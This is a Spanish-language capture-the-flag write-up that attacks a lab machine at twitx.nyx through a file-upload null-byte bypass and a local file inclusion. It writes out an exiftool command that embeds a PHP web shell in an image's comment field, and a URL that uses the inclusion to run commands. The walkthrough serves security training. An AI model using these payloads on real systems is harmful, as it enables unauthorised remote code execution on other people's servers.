Hacemos el escaneo con nmap:
![[Pasted image 20240531123145.png]]
En el puerto 80 vemos una plantilla de apache:
![[Pasted image 20240531123203.png]]
Haciendo fuzzing web, vemos el directorio note:
![[Pasted image 20240531123358.png]]
Donde se nos proporciona un dominio twitx.nyx:
![[Pasted image 20240531123415.png]]
Lo añadimos en el archivo hosts:
![[Pasted image 20240531123444.png]]
Y vemos lo siguiente:
![[Pasted image 20240531123510.png]]
Debajo tenemos un panel de subida de archivos:
![[Pasted image 20240531131335.png]]
Petición interceptada:
![[Pasted image 20240531124723.png]]
Y modificamos el contenido de la imagen para que tenga una reverse shell de php:
![[Pasted image 20240531124929.png]]
Tenemos que hacer un bypass de la extensión utilizando null byte, donde tenemos el siguiente artículo con unas instrucciones:
```bash
https://www.thehacker.recipes/web/inputs/null-byte-injection
```
![[Pasted image 20240531125404.png]]
Por lo que desde burp suite haremos el bypass de esta forma.
![[Pasted image 20240531125434.png]]
Cambiamos también el correo porque sino nos dará error de que dicho email ya existe:
![[Pasted image 20240531125532.png]]
Y vemos que se ha enviado correctamente:
![[Pasted image 20240531125940.png]]
Y dentro del código fuente vemos una cadena de texto url-encodeada:
![[Pasted image 20240531130214.png]]
Lo pasamos por el decoder de burp suite:
![[Pasted image 20240531130403.png]]
Y tenemos el siguiente texto, pero no muestra nada interesante:
![[Pasted image 20240531130626.png]]
Ahora, para acceder al log-in, tenemos que esperar, ya que nos sale el siguiente aviso de que podremos iniciar sesión en su debido tiempo:
![[Pasted image 20240531130914.png]]
Por lo que ejecutamos el siguiente comando para poder adelantar la fecha por 2 días:
```bash
sudo date --set="2 days"
```
![[Pasted image 20240531130942.png]]
Y ya podemos iniciar sesión:
![[Pasted image 20240531131004.png]]
Y ahora estamos dentro de nuestro perfil:
![[Pasted image 20240531131553.png]]
Si miramos el código fuente, vemos como tenemos nuestra imagen subida pero con otro nombre:
![[Pasted image 20240531131618.png]]
Pero si accedemos a ella da error:
![[Pasted image 20240531131641.png]]
No obstante, tenemos esta url que puede ser vulnerable a un LFI:
![[Pasted image 20240531131825.png]]
Vemos que pudimos acceder a la imagen, por lo que vamos a incrustarle una reverse shell para conseguir que ese comando se ejecute:
```bash
exiftool -Comment='<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";?>' penguin.png
```
![[Pasted image 20240531132520.png]]
Y vamos a subir esta nueva imagen al momento de registrarnos:
![[Pasted image 20240531132738.png]]
Vemos la imagen en el código fuente:
![[Pasted image 20240531132804.png]]
![[Pasted image 20240531132810.png]]
Y para acceder a esta imagen para ejecutar un comando, debemos de modificar la URL de arriba:
```bash
folder=upload&file=17925084436659b4094d14f8.53358270.png
```
La url original:
```bash
view-source:http://twitx.nyx/private.php?folder=user&file=profile.php
```
La nueva url:
```bash
view-source:http://twitx.nyx/private.php?folder=upload&file=17925084436659b4094d14f8.53358270.png&cmd=id
```
Y conseguimos obtener esto:
![[Pasted image 20240531133401.png]]
